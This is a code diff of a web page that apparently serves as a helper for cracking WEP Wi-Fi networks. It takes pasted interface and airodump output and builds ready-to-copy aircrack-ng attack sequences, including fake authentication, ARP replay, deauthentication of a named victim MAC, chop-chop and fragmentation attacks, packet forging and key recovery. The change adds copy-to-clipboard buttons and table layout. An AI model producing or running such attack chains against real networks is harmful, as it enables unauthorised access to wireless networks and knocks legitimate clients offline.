@@ -45,9 +45,9 @@ body {font-family: Arial;}
 </head>
 <body>
 <form id="frm1">
-	ip link show<br>
-	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus><br>
-	<p id="searchCommand"></p><br>
+	<p>ip link show<img src="copy.png" onclick="copyLine(this)"></p>
+	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus onKeyUp ="searchCommand()"><br>
+	<p id="searchCommand"></p>
 	<input type="text" id="airodumpInput" style="width:100%" autofocus><br>
 	victim MAC <br>
 	<input type="text" id="victimMAC" style="width:100%" autofocus><br>
@@ -105,6 +105,79 @@ function openTab(evt, cityName) {
   document.getElementById(cityName).style.display = "block";
   evt.currentTarget.className += " active";
 } 
+
+function copyLine(thing) {
+	var text = thing.parentElement.innerText
+	//alert(text)
+    copyTextToClipboard(text)
+} 
+
+function copyTextToClipboard(text) {
+  var textArea = document.createElement("textarea");
+
+  //
+  // *** This styling is an extra step which is likely not required. ***
+  //
+  // Why is it here? To ensure:
+  // 1. the element is able to have focus and selection.
+  // 2. if element was to flash render it has minimal visual impact.
+  // 3. less flakyness with selection and copying which **might** occur if
+  //    the textarea element is not visible.
+  //
+  // The likelihood is the element won't even render, not even a
+  // flash, so some of these are just precautions. However in
+  // Internet Explorer the element is visible whilst the popup
+  // box asking the user for permission for the web page to
+  // copy to the clipboard.
+  //
+
+  // Place in top-left corner of screen regardless of scroll position.
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+
+  // Ensure it has a small width and height. Setting to 1px / 1em
+  // doesn't work as this gives a negative w/h on some browsers.
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+
+  // We don't need padding, reducing the size if it does flash render.
+  textArea.style.padding = 0;
+
+  // Clean up any borders.
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+
+  // Avoid flash of white box if rendered for any reason.
+  textArea.style.background = 'transparent';
+
+
+  textArea.value = text;
+
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+
+  try {
+    var successful = document.execCommand('copy');
+    var msg = successful ? 'successful' : 'unsuccessful';
+    console.log('Copying text command was ' + msg);
+  } catch (err) {
+    console.log('Oops, unable to copy');
+  }
+
+  document.body.removeChild(textArea);
+}
+
+function searchCommand() {
+	var ipLinkShowInput = document.getElementById("ipLinkShowInput").value.trim().replace(/\s\s+/g, ' ');
+	
+	var ipSplit = ipLinkShowInput.split(" ");
+	var deviceName = ipSplit[1];
+	deviceName = deviceName.substring(0, deviceName.length - 1);
+	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP` + '<img src="copy.png" onclick="copyLine(this)">'
+}
 	
 function myFunction() {
 	var airodumpInput = document.getElementById("airodumpInput").value.trim().replace(/\s\s+/g, ' ');
@@ -121,44 +194,69 @@ function myFunction() {
 	deviceName = deviceName.substring(0, deviceName.length - 1);
 	var mac = ipSplit[16].toUpperCase()
 	
-	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP`
+	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP` + '<img src="copy.png" onclick="copyLine(this)">'
 		
 	document.getElementById("classicWEPoutput").innerHTML = 
-		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
-		+ monitorMode(deviceName, channel) + "<br>"
-		+ captureCommand(deviceName, channel, apMac) + "<br>" 
-		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
-		+ arpRelay(apMac, mac, deviceName) + "<br>" 
-		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
-		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+		"<table style='width:100%'>"
+		+ preamble() + setup() + postamble()
+		+ preamble() + monitorMode(deviceName, channel) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
+		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble()
+		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
+		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ "</table>";
 		
 	document.getElementById("clientlessWEPoutput").innerHTML = 
-		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
-		+ monitorMode(deviceName, channel) + "<br>"
-		+ captureCommand(deviceName, channel, apMac) + "<br>" 
-		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
-		+ chopChopAttack(apMac, mac, deviceName) + " OR         "   + fragmentationAttack(apMac, mac, deviceName) + "<br>"    
-		+ packetForge(apMac, mac, deviceName) + "<br>"       
-		+ replayAttack(deviceName) + "<br>"                 
-		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+		"<table style='width:100%'>"
+		+ preamble() + setup() + postamble()
+		+ preamble() + monitorMode(deviceName, channel) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac)+ postamble() 
+		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
+		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName) + postamble()   
+		+ preamble() + packetForge(apMac, mac, deviceName) + postamble() 
+		+ preamble() + replayAttack(deviceName) + postamble()               
+		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ "</table>";
 		
 	document.getElementById("wepViaClientOutput").innerHTML = 
-		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
-		+ monitorMode(deviceName, channel) + "<br>"
-		+ captureCommand(deviceName, channel, apMac) + "<br>" 
-		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
-		+ packetReplayAttack(apMac, deviceName) + "<br>"
-		+ "sudo aircrack-ng -z `ls -t cap1*.cap | head -1`";
+		"<table style='width:100%'>"
+		+ preamble() + setup() + postamble()
+		+ preamble() + monitorMode(deviceName, channel) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
+		+ preamble() + packetReplayAttack(apMac, deviceName) + postamble()
+		+ preamble() + "sudo aircrack-ng -z `ls -t cap1*.cap | head -1`" + postamble();
+		+ "</table>";
 		
 	document.getElementById("sharedKeyWEPoutput").innerHTML = 
-		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
-		+ monitorMode(deviceName, channel) + "<br>"
-		+ captureCommand(deviceName, channel, apMac) + "<br>" 
-		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
-		+ fakeAuthSK(ssid, apMac, mac, deviceName) + "<br>" 
-		+ arpRelay(apMac, mac, deviceName) + "<br>" 
-		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
-		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+		"<table style='width:100%'>"
+		+ preamble() + setup() + postamble()
+		+ preamble() + monitorMode(deviceName, channel) + postamble()
+		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
+		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
+		+ preamble() + fakeAuthSK(ssid, apMac, mac, deviceName) + postamble() 
+		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble() 
+		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
+		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble();
+		+ "</table>";
+}
+
+
+function preamble() {
+	return "<tr><td>";
+}
+
+function copyButton() {
+	return '<img src="copy.png" onclick="copyLine(this)">'
+}
+
+function postamble() {
+	return copyButton() + "</tr></td>";
+}
+
+function setup() {
+	return "sudo airmon-ng check kill; sudo airmon-ng check kill";
 }
 
 function captureCommand(device, channel, ssid) {
